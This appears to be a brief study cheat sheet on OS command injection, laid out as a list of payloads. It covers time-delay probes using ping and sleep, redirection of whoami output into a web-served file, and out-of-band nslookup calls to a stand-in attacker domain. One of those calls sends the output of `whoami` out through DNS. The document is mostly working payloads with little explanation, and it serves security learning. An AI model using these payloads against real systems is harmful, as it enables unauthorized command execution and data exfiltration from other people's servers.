# Detecting command injections

Using mails example:
```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

Using time delays:
```bash
& ping -c 10 127.0.0.1 &
```
Example:
```
&email=x||sleep+10||
```

# Exploiting by redirection output
```bash
& whoami > /var/www/static/whoami.txt &
```
Then visit https://vulnerable-website.com/whoami.txt

# Out of band techniques #OAST

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```